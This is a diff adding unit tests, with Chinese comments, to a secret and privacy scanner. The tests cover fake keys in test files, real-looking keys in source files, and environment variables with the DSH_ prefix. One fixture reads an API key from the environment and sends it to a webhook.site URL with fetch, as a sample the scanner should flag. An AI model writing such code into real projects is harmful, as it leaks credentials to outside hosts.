@@ -108,6 +108,34 @@ test('detects private key blocks and AWS keys', () => {
   assert.ok(scanSecrets('AKIAIOSFODNN7EXAMPLE', { file: 'a.txt' }).some((f) => f.id === 'secret-aws'));
 });
 
+test('test 文件中的 secret-generic 固件假值不算硬编码密钥', () => {
+  // api-relay-audit 与 TokenLedger 的误报样本：测试文件里用于验证脱敏的假密钥。
+  const relay = 'const SECRET = \'sk-dsh-secret-never-log\'';
+  assert.ok(
+    !scanSecrets(relay, { file: 'dsh/test/plugin.test.js' }).some((f) => f.severity === 'critical'),
+    '测试文件里的假密钥不应判为硬编码密钥',
+  );
+  const tokenLedger = 'const secret = "sk-must-never-appear-anywhere";';
+  assert.ok(
+    !scanSecrets(tokenLedger, { file: 'test/discovery.test.js' }).some((f) => f.severity === 'critical'),
+  );
+});
+
+test('非测试文件中的 secret-generic 仍视为硬编码密钥', () => {
+  const prod = 'const secret = "AbCdeFgHiJkLmNoPqRsTuVwXyZ012345";';
+  assert.ok(
+    scanSecrets(prod, { file: 'src/config.js' }).some((f) => f.id === 'secret-generic' && f.severity === 'critical'),
+  );
+});
+
+test('测试文件中精确的常见密钥格式仍不降级（sk-/私有钥等）', () => {
+  const sk = 'const KEY = "sk-1234567890abcdefghijklmnopqrstuvwxyz12";';
+  assert.ok(
+    scanSecrets(sk, { file: 'test/plugin.test.js' }).some((f) => f.id === 'secret-sk' && f.severity === 'critical'),
+    '测试文件中的真实 sk- 长密钥仍应报警',
+  );
+});
+
 // --- scanObfuscation ---
 
 test('flags long base64 blobs and escaped runs', () => {
@@ -130,6 +158,25 @@ test('env-only read is a warning, not critical', () => {
   const notes = privacyFindings('const dir = process.env.HOME;', { file: 'e.js' });
   assert.ok(notes.some((n) => n.severity === 'warning' && /读取环境变量/.test(n.explanation)));
   assert.ok(!notes.some((n) => n.severity === 'critical'));
+});
+
+test('DSH_HOME 等 DSH_ 配置/路径变量不算凭据，即使同文件有网络发送', () => {
+  // DSH_HOME 是 harness home 目录路径，DSH_SHELL 是布尔标记，均非凭据。
+  // 即便同文件出现 fetch，也不应命中「读取凭据类环境变量」的 critical。
+  const withNetwork =
+    'const home = process.env.DSH_HOME; const sh = process.env.DSH_SHELL;\n' +
+    'fetch("https://api.example.com/anything");';
+  const notes = privacyFindings(withNetwork, { file: 'p.js' });
+  assert.ok(
+    !notes.some((n) => /凭据类环境变量/.test(n.explanation)),
+    'DSH_HOME/DSH_SHELL 不应被判为凭据类读取',
+  );
+});
+
+test('DSH_TEST_* 等真正敏感的 DSH_ 环境变量仍视为凭据', () => {
+  const text = 'const k = process.env.DSH_TEST_API_KEY;\nfetch("https://webhook.site/abc", { body: k });';
+  const notes = privacyFindings(text, { file: 'p.js' });
+  assert.ok(notes.some((n) => n.severity === 'critical' && /凭据类环境变量/.test(n.explanation)));
 });
 
 test('extractExternalHosts drops allowlisted domains and www prefix', () => {
